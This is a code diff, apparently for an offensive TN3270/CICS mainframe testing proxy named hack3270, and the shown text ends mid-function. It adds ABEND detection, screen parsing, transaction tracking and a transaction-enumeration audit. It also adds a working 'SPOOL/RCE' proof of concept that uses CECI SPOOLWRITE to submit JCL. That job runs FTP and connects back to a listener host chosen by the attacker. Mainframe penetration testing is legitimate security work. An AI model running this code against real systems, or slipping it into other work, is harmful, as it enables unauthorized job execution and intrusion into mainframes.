@@ -21,8 +21,86 @@ import re
 import select
 import csv
 import datetime
+import json
 
 from pathlib import Path
+
+# CICS ABEND codes and their descriptions
+ABEND_CODES = {
+    'ASRA': 'Program check (possible injection vulnerability)',
+    'ASRB': 'Operating system abend',
+    'AICA': 'Runaway task (infinite loop)',
+    'AEY7': 'Not authorized (security violation - escalation target)',
+    'AEY9': 'CICS unable to process',
+    'AEYD': 'Transaction not found',
+    'AEYF': 'Resource security check failure',
+    'APCT': 'Program not found (enumeration opportunity)',
+    'AFCA': 'DATASET not found',
+    'AFCR': 'DATASET read error',
+    'AKCS': 'Temporary storage queue not found',
+    'AKCT': 'Transient data queue not found',
+    'ASP1': 'Supervisor call',
+    'ATNI': 'Task abend due to node error',
+    'AEXL': 'EXEC interface program not found',
+    'ABMB': 'BMS map not found',
+    'ADTC': 'DL/I call error',
+    'AEIP': 'EXEC CICS command error',
+    'AEZD': 'CICS security violation',
+    'AQRD': 'Queue read error',
+}
+
+# CICS error message prefixes (DFHxxxx)
+CICS_ERROR_PREFIXES = [
+    'DFH', 'DFHAC', 'DFHAM', 'DFHAP', 'DFHBM', 'DFHDB', 'DFHDC',
+    'DFHDU', 'DFHEC', 'DFHED', 'DFHFC', 'DFHIC', 'DFHJC', 'DFHKE',
+    'DFHME', 'DFHMQ', 'DFHPG', 'DFHPI', 'DFHRM', 'DFHRT', 'DFHSM',
+    'DFHSO', 'DFHSR', 'DFHTD', 'DFHTS', 'DFHWB', 'DFHXS', 'DFHZC',
+]
+
+# Security violation patterns for RACF/ACF2/Top Secret audit
+SECURITY_VIOLATION_PATTERNS = [
+    'NOT AUTHORIZED',
+    'NOT AUTH',
+    'SECURITY VIOLATION',
+    'ACCESS DENIED',
+    'RACF',
+    'ICH408I',
+    'ICH409I',
+    'ICH70001I',
+    'IRR012I',
+    'IRR013I',
+    'ACF2',
+    'TOP SECRET',
+    'TSS7000I',
+    'TSS7001I',
+    'INVALID USERID',
+    'INVALID PASSWORD',
+    'PASSWORD EXPIRED',
+    'USERID REVOKED',
+    'DFHAC2002',
+    'DFHAC2008',
+    'DFHAC2032',
+    'DFHAC2034',
+    'TRANSACTION NOT AUTHORIZED',
+    'RESOURCE NOT AUTHORIZED',
+]
+
+# Audit result status codes
+AUDIT_STATUS = {
+    'ACCESSIBLE': 'Transaction executed successfully',
+    'DENIED': 'Security violation detected',
+    'ABEND': 'Transaction caused an ABEND',
+    'NOT_FOUND': 'Transaction not defined',
+    'ERROR': 'CICS error returned',
+    'UNKNOWN': 'Response could not be classified',
+    'SPOOL_OPEN': 'SPOOL API is accessible — RCE possible via INTRDR',
+    'SPOOL_CLOSED': 'SPOOL API not available or not authorized',
+}
+
+# SPOOLOPEN response indicators
+SPOOL_SUCCESS_PATTERNS = ['NORMAL', 'RESPONSE: NORMAL']
+SPOOL_FAIL_PATTERNS = ['INVREQ', 'NOTAUTH', 'DISABLED', 'NOT AUTHORIZED',
+                       'INVALID', 'DFHAC']
 
 # EBCDIC to ASCII table
 e2a = [
@@ -123,6 +201,27 @@ class hack3270:
         self.db_filename = self.project_name + ".db"
         self.found_aids = [] # for keeping track of AIDs found on screen
 
+        # ABEND Detection (PR1)
+        self.abend_detection = False
+        self.abend_history = []
+        self.abend_count = 0
+
+        # Screen Map (PR2)
+        self.current_screen_map = []
+
+        # Transaction Correlation (PR3)
+        self.transaction_tracking = False
+        self.pending_transaction = None
+        self.transaction_history = []
+
+        # Security Audit (PR4)
+        self.audit_running = False
+        self.audit_results = []
+        self.audit_current_txn = None
+        self.audit_txn_list = []
+        self.audit_index = 0
+        self.audit_timestamp_sent = 0
+
         # State Tracking Vars
         self.hack_toggled = False
         self.hack_color_toggled =False
@@ -200,7 +299,7 @@ class hack3270:
 
         self.logger.debug("Opening database file: {}".format(self.db_filename))
 
-        self.sql_con = sqlite3.connect(self.db_filename)
+        self.sql_con = sqlite3.connect(self.db_filename, check_same_thread=False)
         self.sql_con.set_trace_callback(self.logger.debug) # Use log for SQL debugging
         self.sql_cur = self.sql_con.cursor()
 
@@ -234,14 +333,15 @@ class hack3270:
                                     "Server port: {} != Project IP: {}".format(
                                             self.server_port, row[2]
                                     ))
-                if self.proxy_port != int(row[2]):
-                    self.logger.warn("Proxy port from project ({}) "
-                                  "overiding proxy port argument ({}) ".format(
-                                            row[2], self.proxy_port
+                if self.proxy_port != int(row[3]):
+                    self.logger.info("Proxy port from project ({}) "
+                                  "differs from CLI argument ({}), "
+                                  "using CLI value".format(
+                                            row[3], self.proxy_port
                                      ))
-                    
+
                 self.server_port = int(row[2])
-                self.proxy_port = int(row[3])
+                # Keep CLI proxy_port — don't override with DB value
                 self.tls_enabled = int(row[4])
         # else create table with current configuration---
         else:
@@ -297,7 +397,91 @@ class hack3270:
                             RAW_DATA BLOB(4000))
                             """) # 3,564
             self.sql_con.commit()
-        
+
+        # ABEND Detection table (PR1)
+        self.sql_cur.execute("""
+                             SELECT count(name)
+                             FROM sqlite_master
+                             WHERE TYPE='table' AND NAME='Abends'
+                             """)
+        if self.sql_cur.fetchone()[0] != 1:
+            self.logger.debug("Creating Abends table...")
+            self.sql_cur.execute("""
+                            CREATE TABLE Abends (
+                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
+                            TIMESTAMP TEXT,
+                            TYPE TEXT,
+                            CODE TEXT,
+                            DESCRIPTION TEXT,
+                            LOG_ID INTEGER,
+                            FOREIGN KEY (LOG_ID) REFERENCES Logs(ID))
+                            """)
+            self.sql_con.commit()
+
+        # Transaction Correlation table (PR3)
+        self.sql_cur.execute("""
+                             SELECT count(name)
+                             FROM sqlite_master
+                             WHERE TYPE='table' AND NAME='Transactions'
+                             """)
+        if self.sql_cur.fetchone()[0] != 1:
+            self.logger.debug("Creating Transactions table...")
+            self.sql_cur.execute("""
+                            CREATE TABLE Transactions (
+                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
+                            TIMESTAMP_SENT TEXT,
+                            TIMESTAMP_RECV TEXT,
+                            TXN_CODE TEXT,
+                            DURATION_MS REAL,
+                            RESPONSE_LEN INTEGER,
+                            STATUS TEXT)
+                            """)
+            self.sql_con.commit()
+
+        # Security Audit table (PR4)
+        self.sql_cur.execute("""
+                             SELECT count(name)
+                             FROM sqlite_master
+                             WHERE TYPE='table' AND NAME='Audit'
+                             """)
+        if self.sql_cur.fetchone()[0] != 1:
+            self.logger.debug("Creating Audit table...")
+            self.sql_cur.execute("""
+                            CREATE TABLE Audit (
+                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
+                            TIMESTAMP TEXT,
+                            TXN_CODE TEXT,
+                            STATUS TEXT,
+                            RESPONSE_PREVIEW TEXT,
+                            RESPONSE_LEN INTEGER)
+                            """)
+            self.sql_con.commit()
+
+        # Scan Results table (Single Transaction Scan)
+        self.sql_cur.execute("""
+                             SELECT count(name)
+                             FROM sqlite_master
+                             WHERE TYPE='table' AND NAME='ScanResults'
+                             """)
+        if self.sql_cur.fetchone()[0] != 1:
+            self.logger.debug("Creating ScanResults table...")
+            self.sql_cur.execute("""
+                            CREATE TABLE ScanResults (
+                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
+                            TIMESTAMP TEXT,
+                            TXN_CODE TEXT,
+                            STATUS TEXT,
+                            ABENDS TEXT,
+                            FIELD_ANALYSIS TEXT,
+                            PF_KEYS TEXT,
+                            ESM_TYPE TEXT,
+                            RESPONSE_LEN INTEGER,
+                            DURATION_MS REAL,
+                            RESPONSE_PREVIEW TEXT,
+                            FULL_REPORT TEXT)
+                            """)
+            self.sql_con.commit()
+
     def write_database_log(self, direction, notes, data):
 
         if data[0] == 255:
@@ -810,6 +994,902 @@ class hack3270:
         self.logger.debug("Setting mask to '{}'".format(mask))
         self.inject_mask = mask
 
+    # ---- PR1: ABEND Detection Methods ----
+
+    def get_abend_detection(self):
+        return self.abend_detection
+
+    def set_abend_detection(self, value=1):
+        self.abend_detection = value
+
+    def get_abend_count(self):
+        return self.abend_count
+
+    def detect_abend(self, server_data):
+        '''
+        Scans server data for ABEND codes and CICS error messages.
+        Returns list of detected abends (may be empty).
+        '''
+        detections = []
+        ascii_text = self.get_ascii(server_data)
+
+        # Check for ABEND codes
+        for code, description in ABEND_CODES.items():
+            if code in ascii_text:
+                detections.append({
+                    'type': 'ABEND',
+                    'code': code,
+                    'description': description
+                })
+
+        # Check for DFHxxxx error messages
+        for prefix in CICS_ERROR_PREFIXES:
+            pattern = prefix + r'[0-9]{4}'
+            matches = re.findall(pattern, ascii_text)
+            for match in matches:
+                detections.append({
+                    'type': 'CICS_ERROR',
+                    'code': match,
+                    'description': 'CICS error message'
+                })
+
+        return detections
+
+    def write_abend_log(self, abend, log_id=None):
+        '''Writes an abend detection to the database'''
+        self.sql_cur.execute(
+            "INSERT INTO Abends ('TIMESTAMP', 'TYPE', 'CODE', 'DESCRIPTION', 'LOG_ID') VALUES (?, ?, ?, ?, ?)",
+            (str(time.time()), abend['type'], abend['code'], abend['description'], log_id)
+        )
+        self.sql_con.commit()
+        self.abend_count += 1
+        self.abend_history.append(abend)
+
+    def all_abends(self, start=0):
+        '''Gets all abend records from database'''
+        if start > 0:
+            self.sql_cur.execute("SELECT * FROM Abends WHERE ID > {}".format(start))
+        else:
+            self.sql_cur.execute("SELECT * FROM Abends")
+        return self.sql_cur.fetchall()
+
+    # ---- PR2: Screen Map Parsing Methods ----
+
+    def decode_buffer_address(self, b1, b2):
+        '''
+        Decodes a 3270 buffer address (2 bytes) to row, col.
+        Supports both 14-bit and 12-bit addressing.
+        Returns (row, col) tuple with 0-based values.
+        '''
+        # 14-bit addressing
+        if b1 & 0xC0 == 0x00:
+            address = ((b1 & 0x3F) << 8) | b2
+        else:
+            # 12-bit addressing (6 bits from each byte)
+            address = ((b1 & 0x3F) << 6) | (b2 & 0x3F)
+
+        # Standard 80-column screen
+        cols = 80
+        row = address // cols
+        col = address % cols
+        return (row, col)
+
+    def decode_field_attribute(self, attr_byte):
+        '''
+        Decodes a 3270 field attribute byte into its component flags.
+        Returns dict with: protected, numeric, hidden, intensity, modified
+        '''
+        return {
+            'protected': bool(attr_byte & 0x20),
+            'numeric': bool(attr_byte & 0x10),
+            'hidden': (attr_byte & 0x0C) == 0x0C,
+            'intensity': ['normal', 'normal', 'high', 'hidden'][
+                (attr_byte & 0x0C) >> 2
+            ],
+            'modified': bool(attr_byte & 0x01),
+        }
+
+    def parse_screen_map(self, server_data):
+        '''
+        Parses a 3270 data stream and extracts field information.
+        Returns list of field dicts with: row, col, type, protected, hidden,
+        numeric, content, attr_byte
+        '''
+        fields = []
+        data = server_data
+
+        # Skip telnet data
+        if len(data) < 2 or data[0] == 0xFF:
+            self.current_screen_map = []
+            return []
+
+        # Check for TN3270E header (5 bytes)
+        offset = 0
+        if len(data) > 5 and data[0] == 0x00 and data[4] in (0x00, 0x01, 0x02):
+            offset = 5
+
+        # Skip write command byte and WCC byte
+        if offset + 1 < len(data):
+            write_cmd = data[offset]
+            # Valid write commands: W(0x01/0xF1), EW(0x05/0xF5), EWA(0x7E/0x6E)
+            if write_cmd in (0x01, 0xF1, 0x05, 0xF5, 0x7E, 0x6E):
+                offset += 2  # skip cmd + WCC
+            else:
+                self.current_screen_map = []
+                return []
+
+        i = offset
+        current_row = 0
+        current_col = 0
+        current_content = bytearray()
+        current_field = None
+
+        while i < len(data):
+            byte = data[i]
+
+            if byte == 0x11 and i + 2 < len(data):  # SBA (Set Buffer Address)
+                # Flush content to current field
+                if current_field is not None and current_content:
+                    current_field['content'] = self.get_ascii(bytes(current_content))
+                    current_content = bytearray()
+
+                current_row, current_col = self.decode_buffer_address(data[i+1], data[i+2])
+                i += 3
+                continue
+
+            elif byte == 0x1D and i + 1 < len(data):  # SF (Start Field)
+                # Flush previous field
+                if current_field is not None and current_content:
+                    current_field['content'] = self.get_ascii(bytes(current_content))
+                    current_content = bytearray()
+
+                attr = self.decode_field_attribute(data[i+1])
+                field_type = 'protected' if attr['protected'] else 'input'
+                current_field = {
+                    'row': current_row,
+                    'col': current_col,
+                    'type': field_type,
+                    'protected': attr['protected'],
+                    'hidden': attr['hidden'],
+                    'numeric': attr['numeric'],
+                    'intensity': attr['intensity'],
+                    'content': '',
+                    'length': 0,
+                    'attr_byte': data[i+1],
+                }
+                fields.append(current_field)
+                current_col += 1  # field starts after attr byte
+                i += 2
+                continue
+
+            elif byte == 0x29 and i + 1 < len(data):  # SFE (Start Field Extended)
+                # Flush previous field
+                if current_field is not None and current_content:
+                    current_field['content'] = self.get_ascii(bytes(current_content))
+                    current_content = bytearray()
+
+                pair_count = data[i+1]
+                attr_byte = 0x00
+                for p in range(pair_count):
+                    idx = i + 2 + (p * 2)
+                    if idx + 1 < len(data) and data[idx] == 0xC0:
+                        attr_byte = data[idx + 1]
+
+                attr = self.decode_field_attribute(attr_byte)
+                field_type = 'protected' if attr['protected'] else 'input'
+                current_field = {
+                    'row': current_row,
+                    'col': current_col,
+                    'type': field_type,
+                    'protected': attr['protected'],
+                    'hidden': attr['hidden'],
+                    'numeric': attr['numeric'],
+                    'intensity': attr['intensity'],
+                    'content': '',
+                    'length': 0,
+                    'attr_byte': attr_byte,
+                }
+                fields.append(current_field)
+                i += 2 + (pair_count * 2)
+                current_col += 1
+                continue
+
+            elif byte == 0x2C and i + 1 < len(data):  # MF (Modify Field)
+                pair_count = data[i+1]
+                i += 2 + (pair_count * 2)
+                continue
+
+            elif byte == 0x13:  # IC (Insert Cursor)
+                i += 1
+                continue
+
+            elif byte == 0x05:  # PT (Program Tab)
+                i += 1
+                continue
+
+            elif byte == 0x0C:  # FF (Form Feed)
+                i += 1
+                continue
+
+            elif byte == 0x3C:  # RA (Repeat to Address)
+                if i + 3 < len(data):
+                    i += 4
+                else:
+                    i += 1
+                continue
+
+            elif byte == 0x12:  # EUA (Erase Unprotected to Address)
+                if i + 2 < len(data):
+                    i += 3
+                else:
+                    i += 1
+                continue
+
+            else:
+                # Regular data byte
+                current_content.append(byte)
+                current_col += 1
+                i += 1
+
+        # Flush last field
+        if current_field is not None and current_content:
+            current_field['content'] = self.get_ascii(bytes(current_content))
+
+        # Calculate lengths
+        for f in fields:
+            f['length'] = len(f['content'])
+
+        # Assign labels: for input fields, look at preceding protected field text
+        for idx, f in enumerate(fields):
+            if f['type'] == 'input' and idx > 0:
+                prev = fields[idx - 1]
+                if prev['type'] == 'protected' and prev['content'].strip():
+                    f['label'] = prev['content'].strip()
+
+        self.current_screen_map = fields
+        return fields
+
+    def get_screen_map(self):
+        return self.current_screen_map
+
+    # ---- PR3: Transaction Correlation Methods ----
+
+    def get_transaction_tracking(self):
+        return self.transaction_tracking
+
+    def set_transaction_tracking(self, value=1):
+        self.transaction_tracking = value
+
+    def detect_transaction_code(self, client_data):
+        '''
+        Extracts the transaction code from client data.
+        After AID byte + cursor address (SBA), read EBCDIC chars until
+        next SBA or field mark.
+        Returns transaction code string or None.
+        '''
+        if len(client_data) < 4:
+            return None
+
+        # Determine offset based on TN3270 vs TN3270E
+        offset = 0
+        # TN3270E has 5-byte header
+        if len(client_data) > 5 and client_data[0] == 0x00:
+            offset = 5
+
+        # AID byte
+        aid_byte = client_data[offset]
+        offset += 1
+
+        # Check if this is a short-read AID (CLEAR, PA1-3) - no cursor/data
+        short_aids = [0x6D, 0x6C, 0x6E, 0x6B]  # CLEAR, PA1, PA2, PA3
+        if aid_byte in short_aids:
+            return None
+
+        # Skip cursor address (2 bytes)
+        if offset + 2 > len(client_data):
+            return None
+        offset += 2
+
+        # Now check for SBA + buffer address before data
+        if offset < len(client_data) and client_data[offset] == 0x11:
+            offset += 3  # skip SBA + 2-byte address
+
+        # Read EBCDIC data bytes until next order byte or end
+        txn_bytes = bytearray()
+        while offset < len(client_data):
+            b = client_data[offset]
+            # Stop at order bytes or field marks
+            if b in (0x11, 0x1D, 0x29, 0x2C, 0x13, 0x1E, 0xFF):
+                break
+            txn_bytes.append(b)
+            offset += 1
+
+        if not txn_bytes:
+            return None
+
+        # Convert to ASCII and extract first word (transaction code)
+        ascii_text = self.get_ascii(bytes(txn_bytes)).strip()
+        # Transaction codes are 1-4 chars typically, max 8
+        txn_code = ascii_text.split()[0] if ascii_text.split() else None
+
+        if txn_code and len(txn_code) <= 8 and re.match(r'^[A-Z0-9@#$]+$', txn_code):
+            return txn_code
+        return None
+
+    def start_transaction(self, txn_code):
+        '''Records the start of a transaction'''
+        self.pending_transaction = {
+            'code': txn_code,
+            'timestamp_sent': time.time(),
+        }
+        self.logger.debug("Transaction started: {}".format(txn_code))
+
+    def complete_transaction(self, server_data):
+        '''Completes a pending transaction with server response'''
+        if not self.pending_transaction:
+            return None
+
+        now = time.time()
+        duration_ms = (now - self.pending_transaction['timestamp_sent']) * 1000
+        txn = {
+            'code': self.pending_transaction['code'],
+            'timestamp_sent': self.pending_transaction['timestamp_sent'],
+            'timestamp_recv': now,
+            'duration_ms': round(duration_ms, 2),
+            'response_len': len(server_data),
+            'status': 'COMPLETE',
+        }
+        self.transaction_history.append(txn)
+        self.write_transaction_log(txn)
+        self.pending_transaction = None
+        return txn
+
+    def write_transaction_log(self, txn):
+        '''Writes a transaction record to the database'''
+        self.sql_cur.execute(
+            "INSERT INTO Transactions ('TIMESTAMP_SENT', 'TIMESTAMP_RECV', 'TXN_CODE', 'DURATION_MS', 'RESPONSE_LEN', 'STATUS') VALUES (?, ?, ?, ?, ?, ?)",
+            (str(txn['timestamp_sent']), str(txn['timestamp_recv']),
+             txn['code'], txn['duration_ms'], txn['response_len'], txn['status'])
+        )
+        self.sql_con.commit()
+
+    def all_transactions(self, start=0):
+        '''Gets all transaction records from database'''
+        if start > 0:
+            self.sql_cur.execute("SELECT * FROM Transactions WHERE ID > {}".format(start))
+        else:
+            self.sql_cur.execute("SELECT * FROM Transactions")
+        return self.sql_cur.fetchall()
+
+    def get_transaction_stats(self):
+        '''Returns summary statistics for transactions'''
+        self.sql_cur.execute("SELECT COUNT(*), AVG(DURATION_MS), MIN(DURATION_MS), MAX(DURATION_MS) FROM Transactions")
+        row = self.sql_cur.fetchone()
+        return {
+            'count': row[0] or 0,
+            'avg_ms': round(row[1], 2) if row[1] else 0,
+            'min_ms': round(row[2], 2) if row[2] else 0,
+            'max_ms': round(row[3], 2) if row[3] else 0,
+        }
+
+    # ---- PR4: Security Audit Methods ----
+
+    def get_audit_running(self):
+        return self.audit_running
+
+    def classify_response(self, server_data):
+        '''
+        Classifies a server response for security audit purposes.
+        Returns status string: ACCESSIBLE, DENIED, ABEND, NOT_FOUND, ERROR, UNKNOWN
+        '''
+        ascii_text = self.get_ascii(server_data)
+
+        # Check for ABENDs first (reuses PR1 logic)
+        abends = self.detect_abend(server_data)
+        for a in abends:
+            if a['code'] == 'APCT' or a['code'] == 'AEYD':
+                return 'NOT_FOUND'
+            if a['code'] == 'AEY7' or a['code'] == 'AEYF' or a['code'] == 'AEZD':
+                return 'DENIED'
+            if a['type'] == 'ABEND':
+                return 'ABEND'
+
+        # Check for security violation patterns
+        ascii_upper = ascii_text.upper()
+        for pattern in SECURITY_VIOLATION_PATTERNS:
+            if pattern in ascii_upper:
+                return 'DENIED'
+
+        # Check for CICS error messages
+        for prefix in CICS_ERROR_PREFIXES:
+            if re.search(prefix + r'[0-9]{4}', ascii_text):
+                return 'ERROR'
+
+        # Check for common "not found" messages
+        not_found_patterns = ['INVALID TRANSACTION', 'UNKNOWN TRANSACTION',
+                             'TRANSACTION INVALID', 'UNDEFINED TRANSACTION']
+        for p in not_found_patterns:
+            if p in ascii_upper:
+                return 'NOT_FOUND'
+
+        return 'ACCESSIBLE'
+
+    def audit_start(self, txn_list):
+        '''Starts a security audit with the given list of transaction codes'''
+        self.audit_txn_list = txn_list
+        self.audit_index = 0
+        self.audit_results = []
+        self.audit_running = True
+        self.audit_current_txn = None
+        self.logger.debug("Security audit started with {} transactions".format(len(txn_list)))
+
+    def audit_stop(self):
+        '''Stops the running audit'''
+        self.audit_running = False
+        self.audit_current_txn = None
+        self.logger.debug("Security audit stopped")
+
+    def build_clear_payload(self, is_tn3270e):
+        '''Builds the CLEAR key payload. Pure function — no I/O.'''
+        if is_tn3270e:
+            return b'\x00\x00\x00\x00\x01\x6d\xff\xef'
+        return b'\x6d\xff\xef'
+
+    def build_txn_payload(self, txn_code, is_tn3270e):
+        '''Builds a transaction submission payload. Pure function — no I/O.'''
+        txn_ebcdic = self.get_ebcdic(txn_code)
+        if is_tn3270e:
+            return b'\x00\x00\x00\x00\x01\x7d\x5b\x60' + txn_ebcdic + b'\xff\xef'
+        return b'\x7d\x5b\x60' + txn_ebcdic + b'\xff\xef'
+
+    def encode_buffer_address(self, row, col):
+        '''Encodes row, col to a 2-byte 12-bit SBA address.'''
+        address = row * 80 + col
+        # 12-bit encoding lookup table (6 bits per byte)
+        lookup = [0x40, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
+                  0xC8, 0xC9, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
+                  0x50, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
+                  0xD8, 0xD9, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
+                  0x60, 0x61, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
+                  0xE8, 0xE9, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
+                  0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
+                  0xF8, 0xF9, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F]
+        b1 = lookup[(address >> 6) & 0x3F]
+        b2 = lookup[address & 0x3F]
+        return bytes([b1, b2])
+
+    def build_input_payload(self, text, row, col, is_tn3270e, aid=0x7d):
+        '''Builds a payload to send text at a specific field position.
+        aid: AID byte (default 0x7d = ENTER)'''
+        sba = self.encode_buffer_address(row, col)
+        text_ebcdic = self.get_ebcdic(text)
+        # SBA order byte = 0x11
+        payload = bytes([aid]) + b'\x11' + sba + text_ebcdic + b'\xff\xef'
+        if is_tn3270e:
+            payload = b'\x00\x00\x00\x00\x01' + payload
+        return payload
+
+    # ---- SPOOL/RCE Detection ----
+
+    def build_ceci_payload(self, command, is_tn3270e):
+        '''Builds a payload to send a CECI command (typed as transaction input).'''
+        return self.build_txn_payload(command, is_tn3270e)
+
+    def _spool_send_and_read(self, command, is_tn3270e):
+        '''Sends a CECI command and reads response. Returns ASCII text of response.'''
+        # CLEAR first
+        self.server.send(self.build_clear_payload(is_tn3270e))
+        try:
+            rlist, _, _ = select.select([self.server], [], [], 0.5)
+            if self.server in rlist:
+                self.server.recv(BUFFER_MAX)
+        except Exception:
+            pass
+
+        # Send CECI command
+        payload = self.build_ceci_payload(command, is_tn3270e)
+        self.write_database_log('C', 'SPOOL: {}'.format(command), payload)
+        self.server.send(payload)
+
+        # Read response
+        try:
+            rlist, _, _ = select.select([self.server], [], [], 3)
+            if self.server in rlist:
+                server_data = self.server.recv(BUFFER_MAX)
+                self.write_database_log('S', 'SPOOL response', server_data)
+                return self.get_ascii(server_data), server_data
+        except Exception:
+            pass
+        return '', b''
+
+    def spool_check(self):
+        '''Level 1: Passive SPOOL detection.
+        Sends SPOOLOPEN then SPOOLCLOSE via CECI. No JCL written.
+        Returns dict with status and details.'''
+        is_tn3270e = self.check_inject_3270e()
+
+        # Step 1: Try SPOOLOPEN
+        open_cmd = 'CECI SPOOLOPEN OUTPUT TOKEN(H3TK)'
+        open_text, open_raw = self._spool_send_and_read(open_cmd, is_tn3270e)
+        open_upper = open_text.upper()
+
+        result = {
+            'command': open_cmd,
+            'response_preview': re.sub(r'\[0x[0-9A-Fa-f]{2}\]', '', open_text).strip()[:300],
+            'timestamp': time.time(),
+        }
+
+        # Check if SPOOLOPEN succeeded
+        spool_open = any(p in open_upper for p in SPOOL_SUCCESS_PATTERNS)
+
+        if spool_open:
+            # Close the spool handle cleanly
+            close_cmd = 'CECI SPOOLCLOSE TOKEN(H3TK)'
+            self._spool_send_and_read(close_cmd, is_tn3270e)
+            result['status'] = 'SPOOL_OPEN'
+            result['detail'] = 'SPOOLOPEN returned NORMAL — SPOOL API accessible. RCE via INTRDR is possible.'
+        else:
+            result['status'] = 'SPOOL_CLOSED'
+            fail_reason = 'Unknown'
+            for p in SPOOL_FAIL_PATTERNS:
+                if p in open_upper:
+                    fail_reason = p
+                    break
+            result['detail'] = 'SPOOLOPEN denied: {}'.format(fail_reason)
+
+        # Log to audit table
+        self.write_audit_log({
+            'txn_code': 'SPOOL_CHECK',
+            'status': result['status'],
+            'response_preview': result['response_preview'],
+            'response_len': len(open_raw),
+            'timestamp': result['timestamp'],
+        })
+        self.audit_results.append(result)
+
+        self.logger.debug("SPOOL check result: {}".format(result['status']))
+        return result
+
+    def spool_poc_ftp(self, listener_ip, listener_port):
+        '''Level 2: Active PoC — writes FTP JCL via SPOOLWRITE.
+        Submits a job that connects back to listener_ip:listener_port.
+        Returns dict with status and details.'''
+        is_tn3270e = self.check_inject_3270e()
+        port_str = str(listener_port)
+
+        results = []
+
+        # Step 1: SPOOLOPEN
+        open_cmd = 'CECI SPOOLOPEN OUTPUT TOKEN(H3TK)'
+        open_text, _ = self._spool_send_and_read(open_cmd, is_tn3270e)
+        open_upper = open_text.upper()
+
+        if not any(p in open_upper for p in SPOOL_SUCCESS_PATTERNS):
+            return {'status': 'SPOOL_CLOSED', 'detail': 'SPOOLOPEN failed — cannot proceed.',
+                    'results': [], 'timestamp': time.time()}
+
+        # Step 2: Write JCL lines
+        jcl_lines = [
+            '//H3FTPJB JOB ,H3270,CLASS=A,MSGCLASS=H',
+            '//STEP1   EXEC PGM=FTP',
+            '//INPUT   DD *',
+            'OPEN {} {}'.format(listener_ip, port_str),
+            'QUIT',
+            '/*',
+        ]
+
+        all_ok = True
+        for line in jcl_lines:
+            # CECI SPOOLWRITE with FROM() — max 72 chars per JCL line
+            write_cmd = "CECI SPOOLWRITE TOKEN(H3TK) FROM('{}')".format(line)
+            write_text, _ = self._spool_send_and_read(write_cmd, is_tn3270e)
+            write_upper = write_text.upper()
+            ok = any(p in write_upper for p in SPOOL_SUCCESS_PATTERNS)
+            results.append({'line': line, 'ok': ok, 'response': write_text[:200]})
+            if not ok:
+                all_ok = False
+                break
+
+        # Step 3: SPOOLCLOSE to submit
+        close_cmd = 'CECI SPOOLCLOSE TOKEN(H3TK)'
+        close_text, _ = self._spool_send_and_read(close_cmd, is_tn3270e)
+
+        status = 'SPOOL_OPEN' if all_ok else 'ERROR'
+        detail = ('FTP PoC submitted — job H3FTPJB should connect to {}:{}. '
+                  'Check your listener.'.format(listener_ip, port_str) if all_ok
+                  else 'SPOOLWRITE failed during JCL submission.')
+
+        result = {
+            'status': status,
+            'detail': detail,
+            'jcl_lines': len(jcl_lines),
+            'lines_written': sum(1 for r in results if r['ok']),
+            'results': results,
+            'listener': '{}:{}'.format(listener_ip, port_str),
+            'timestamp': time.time(),
+        }
+
+        self.write_audit_log({
+            'txn_code': 'SPOOL_POC_FTP',
+            'status': status,
+            'response_preview': detail,
+            'response_len': 0,
+            'timestamp': result['timestamp'],
+        })
+        self.audit_results.append(result)
+
+        self.logger.debug("SPOOL PoC FTP result: {}".format(status))
+        return result
+
+    def audit_next(self):
+        '''
+        Sends the next transaction in the audit list.
+        Sends CLEAR first, then the transaction code.
+        Returns the transaction code sent, or None if done.
+        '''
+        if self.audit_index >= len(self.audit_txn_list):
+            self.audit_running = False
+            return None
+
+        txn_code = self.audit_txn_list[self.audit_index].strip()
+        self.audit_current_txn = txn_code
+        self.audit_timestamp_sent = time.time()
+
+        is_tn3270e = self.check_inject_3270e()
+
+        # Send CLEAR key first
+        self.server.send(self.build_clear_payload(is_tn3270e))
+
+        # Wait briefly for CLEAR response
+        try:
+            rlist, _, _ = select.select([self.server], [], [], 0.3)
+            if self.server in rlist:
+                clear_response = self.server.recv(BUFFER_MAX)
+                self.client.send(clear_response)
+        except Exception:
+            pass
+
+        # Send the transaction code
+        payload = self.build_txn_payload(txn_code, is_tn3270e)
+        self.write_database_log('C', 'Audit: sending {}'.format(txn_code), payload)
+        self.server.send(payload)
+        self.audit_index += 1
+
+        self.logger.debug("Audit: sent transaction {}".format(txn_code))
+        return txn_code
+
+    def audit_process_response(self, server_data):
+        '''Processes the server response for the current audit transaction'''
+        if not self.audit_current_txn:
+            return None
+
+        status = self.classify_response(server_data)
+        now = time.time()
+
+        # Get a text preview
+        ascii_text = self.get_ascii(server_data)
+        # Clean up preview - remove control char placeholders
+        preview = re.sub(r'\[0x[0-9A-Fa-f]{2}\]', '', ascii_text).strip()[:200]
+
+        result = {
+            'txn_code': self.audit_current_txn,
+            'status': status,
+            'response_preview': preview,
+            'response_len': len(server_data),
+            'timestamp': now,
+        }
+
+        self.audit_results.append(result)
+        self.write_audit_log(result)
+        self.audit_current_txn = None
+
+        return result
+
+    def write_audit_log(self, result):
+        '''Writes an audit result to the database'''
+        self.sql_cur.execute(
+            "INSERT INTO Audit ('TIMESTAMP', 'TXN_CODE', 'STATUS', 'RESPONSE_PREVIEW', 'RESPONSE_LEN') VALUES (?, ?, ?, ?, ?)",
+            (str(result['timestamp']), result['txn_code'], result['status'],
+             result['response_preview'], result['response_len'])
+        )
+        self.sql_con.commit()
+
+    def all_audit_results(self, start=0):
+        '''Gets all audit results from database'''
+        if start > 0:
+            self.sql_cur.execute("SELECT * FROM Audit WHERE ID > {}".format(start))
+        else:
+            self.sql_cur.execute("SELECT * FROM Audit")
+        return self.sql_cur.fetchall()
+
+    def export_audit_csv(self, csv_filename=False):
+        '''Exports audit results to CSV'''
+        if not csv_filename:
+            csv_filename = self.project_name + "_audit.csv"
+
